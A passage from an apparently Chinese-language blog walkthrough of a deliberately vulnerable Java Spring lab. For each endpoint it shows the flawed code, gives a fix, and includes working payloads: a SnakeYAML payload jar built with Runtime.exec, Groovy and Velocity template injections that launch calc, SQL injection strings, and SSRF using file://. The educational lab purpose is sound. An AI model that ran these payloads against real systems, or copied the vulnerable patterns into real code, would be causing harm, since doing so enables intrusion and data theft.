class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ScriptEngine <span class="title function_">getScriptEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>整个脚本也都比较简单，就是实现了ScriptEngineFactory接口，然后调用Runtime.getRuntime().exec执行命令。</p><p>payload链接：<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>打包为jar</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:/Users/11/AppData/Roaming/Typora/typora-user-images/image-20250525193848130.png" alt="image-20250525193848130" loading="lazy"></p><p>漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/sec/yarm&quot;)</span><br><span class="line">public void secYarm(String content) &#123;</span><br><span class="line">    Yaml y = new Yaml(new SafeConstructor());</span><br><span class="line">    y.load(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-rce-groovy"><a href="#5-rce-groovy" class="headerlink" title="5.&#x2F;rce&#x2F;groovy"></a>5.&#x2F;rce&#x2F;groovy</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;groovy&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">groovyshell</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">    groovyShell.evaluate(content);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy 代码能够与 Java 代码很好地结合，也能用于扩展现有代码。由于其运行在 JVM 上的特性，Groovy 可以使用其他 Java 语言编写的库。</p><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/rce/groovy?content=&quot;calc.exe&quot;.execute()</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505251952938.png" alt="image-20250525195244895" loading="lazy"></p><p>由于靶场是在docker搭建的，所以弹不出计算器，会提示不存在这个文件</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="1-sqli-jdbc-vuln"><a href="#1-sqli-jdbc-vuln" class="headerlink" title="1.&#x2F;sqli&#x2F;jdbc&#x2F;vuln"></a>1.&#x2F;sqli&#x2F;jdbc&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/jdbc/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">jdbc_sqli_vul</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!con.isClosed())</span><br><span class="line">            System.out.println(<span class="string">&quot;Connect to database successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// sqli vuln code</span></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> con.createStatement();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        logger.info(sql);</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">res_pwd</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s: %s\n&quot;</span>, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;Sorry, can&#x27;t find the Driver!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>漏洞成因：直接插入username，造成sql注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=-1&#x27; union select 1,database(),3,4--+</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252024745.png" alt="image-20250525202433620" loading="lazy"></p><p>防护</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="comment">// fix code</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">st.setString(<span class="number">1</span>, username);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-sqli-jdbc-ps-vuln"><a href="#2-sqli-jdbc-ps-vuln" class="headerlink" title="2.&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln"></a>2.&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/jdbc/ps/vuln&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">jdbc_ps_vuln</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(driver);</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!con.isClosed())</span><br><span class="line">                System.out.println(<span class="string">&quot;Connecting to Database successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">            logger.info(st.toString());</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> st.executeQuery();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">res_pwd</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s: %s\n&quot;</span>, res_name, res_pwd);</span><br><span class="line">                result.append(info);</span><br><span class="line">                logger.info(info);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            rs.close();</span><br><span class="line">            con.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;Sorry, can&#x27;t find the Driver!&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>漏洞成因：预处理语句在sql语句之后，没起到防护的作用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String sql = &quot;select * from users where username = &#x27;&quot; + username + &quot;&#x27;&quot;;</span><br><span class="line">PreparedStatement st = con.prepareStatement(sql);</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252035488.png" alt="image-20250525203533438" loading="lazy"></p><h4 id="3-sqli-mybatis-vuln01"><a href="#3-sqli-mybatis-vuln01" class="headerlink" title="3.&#x2F;sqli&#x2F;mybatis&#x2F;vuln01"></a>3.&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/mybatis/vuln01&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">mybatisVuln01</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> userMapper.findByUserNameVuln01(username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来看findByUserNameVuln01</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;select * from users where username = &#x27;$&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">findByUserNameVuln01</span><span class="params">(<span class="meta">@Param(&quot;username&quot;)</span> String username)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里用到的是MyBatis框架，用来指定 SQL 查询语句。**<code>$&#123;username&#125;</code>**：在这里，<code>username</code> 是直接拼接到 SQL 查询中的。这意味着输入的内容会直接插入到 SQL 语句中，而不会进行任何预处理或转义。因此我们仍然可以用上面的方法进行SQL注入。</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png" loading="lazy"></p><p>修复代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png" alt="image-20250525210117585" loading="lazy"></p><h4 id="4-sqli-mybatis-vuln02"><a href="#4-sqli-mybatis-vuln02" class="headerlink" title="4.&#x2F;sqli&#x2F;mybatis&#x2F;vuln02"></a>4.&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/mybatis/vuln02&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">mybatisVuln02</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> userMapper.findByUserNameVuln02(username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来看findByUserNameVuln02</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;User&gt; <span class="title function_">findByUserNameVuln02</span><span class="params">(String username)</span>;</span><br></pre></td></tr></table></figure><p>这里去掉了映射关系，不影响漏洞存在，仍然可以使用之前payload</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252119621.png" alt="image-20250525211935573" loading="lazy"></p><h4 id="5-sqli-mybatis-orderby-vuln03"><a href="#5-sqli-mybatis-orderby-vuln03" class="headerlink" title="5.&#x2F;sqli&#x2F;mybatis&#x2F;orderby&#x2F;vuln03"></a>5.&#x2F;sqli&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/mybatis/orderby/vuln03&quot;)</span><br><span class="line">   public List&lt;User&gt; mybatisVuln03(@RequestParam(&quot;sort&quot;) String sort) &#123;</span><br><span class="line">       return userMapper.findByUserNameVuln03(sort);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们来看findByUserNameVuln03</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;User&gt; findByUserNameVuln03(@Param(&quot;order&quot;) String order);</span><br></pre></td></tr></table></figure><p>使用了MyBatis框架中的order字段，换用下面方法进行注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=id desc--+</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252145129.png" alt="image-20250525214518039" loading="lazy"></p><h4 id="sql注入修复与防护"><a href="#sql注入修复与防护" class="headerlink" title="sql注入修复与防护"></a>sql注入修复与防护</h4><p>1.预编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.waf</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">FILTER_PATTERN</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[a-zA-Z0-9_/\\.-]+$&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">sqlFilter</span><span class="params">(String sql)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (!FILTER_PATTERN.matcher(sql).matches()) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> sql;</span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3.MyBatis防护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)</span><br></pre></td></tr></table></figure><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><h4 id="ssti-velocity"><a href="#ssti-velocity" class="headerlink" title="&#x2F;ssti&#x2F;velocity"></a>&#x2F;ssti&#x2F;velocity</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">@GetMapping(&quot;/velocity&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">velocity</span><span class="params">(String template)</span> &#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line"></span><br><span class="line">        <span class="type">VelocityContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line"></span><br><span class="line">        context.put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;Elliot A.&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;address&quot;</span>, <span class="string">&quot;217 E Broadway&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;555-1337&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">swOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        Velocity.evaluate(context, swOut, <span class="string">&quot;test&quot;</span>, template);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://zhida.zhihu.com/search?content_id=247409254&content_type=Article&match_order=1&q=Apache+Velocity&zhida_source=entity">Apache Velocity</a>是一个基于模板的引擎，用于生成文本输出(例如：HTML、XML或任何其他形式的ASCII文本)，它的设计目标是提供一种简单且灵活的方式来将模板和<a href="https://zhida.zhihu.com/search?content_id=247409254&content_type=Article&match_order=1&q=%E4%B8%8A%E4%B8%8B%E6%96%87%E6%95%B0%E6%8D%AE&zhida_source=entity">上下文数据</a>结合在一起，因此被广泛应用于各种Java应用程序中包括Web应用</p><p>模版注入问题各个语言斗鱼，但这里只用到了velocity，除了velocity，thymeleaf等都是会有ssti问题</p><p><strong>Velocity.evaluate</strong></p><p><strong>方法介绍</strong></p><p>Velocity.evaluate是Velocity引擎中的一个方法，用于处理字符串模板的评估，Velocity是一个基于Java的模板引擎，广泛应用于WEB开发和其他需要动态内容生成的场合，Velocity.evaluate方法的主要作用是将给定的模板字符串与上下文对象结合并生成最终的输出结果，这个方法通常用于在运行时动态创建内容，比如：生成HTML页面的内容或电子邮件的文本，方法如下所示：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static void evaluate(Context context, Writer writer, String templateName, String template)</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>Context context：提供模板所需的数据上下文，可以包含多个键值对</li><li>Writer writer：输出流，用于写入生成的内容</li><li>String templateName：模板的名称，通常用于调试信息中</li><li>String template：要评估的模板字符串</li></ul><p>我们构造如下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272017990.png" alt="image-20250527201721864" loading="lazy"></p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="1-ssrf-urlConnection-vuln"><a href="#1-ssrf-urlConnection-vuln" class="headerlink" title="1.&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln"></a>1.&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/urlConnection/vuln&quot;, method = &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">URLConnectionVuln</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> HttpUtils.URLConnection(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们来看URLConnection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">URLConnection</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">URLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> u.openConnection();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(urlConnection.getInputStream())); <span class="comment">//send request</span></span><br><span class="line">        String inputLine;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">html</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            html.append(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> html.toString();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e.getMessage());</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以用文件读取协议file:&#x2F;&#x2F;实现访问</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272053224.png" alt="image-20250527205331156" loading="lazy"></p><h4 id="2-ssrf-HttpURLConnection-vuln"><a href="#2-ssrf-HttpURLConnection-vuln" class="headerlink" title="2.&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln"></a>2.&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/HttpURLConnection/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">httpURLConnectionVuln</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> HttpUtils.HttpURLConnection(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来看HttpURLConnection</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">HttpURLConnection</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">            <span class="type">URLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> u.openConnection();</span><br><span class="line">            <span class="type">HttpURLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> (HttpURLConnection) urlConnection;</span><br><span class="line"><span class="comment">//             conn.setInstanceFollowRedirects(false);</span></span><br><span class="line"><span class="comment">//             Many HttpURLConnection methods can send http request, such as getResponseCode, getHeaderField</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> conn.getInputStream();  <span class="comment">// send request</span></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line">            String inputLine;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">html</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                html.append(inputLine);</span><br><span class="line">            &#125;</span><br><span class="line">            in.close();</span><br><span class="line">            <span class="keyword">return</span> html.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(e.getMessage());</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里用HttpURLConnection做了强转，限制只能用http&#x2F;htps协议，但可以访问内网其他主机</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272105083.png" alt="image-20250527210533999" loading="lazy"></p><p>访问到了首页</p><h4 id="3-ssrf-openStream"><a href="#3-ssrf-openStream" class="headerlink" 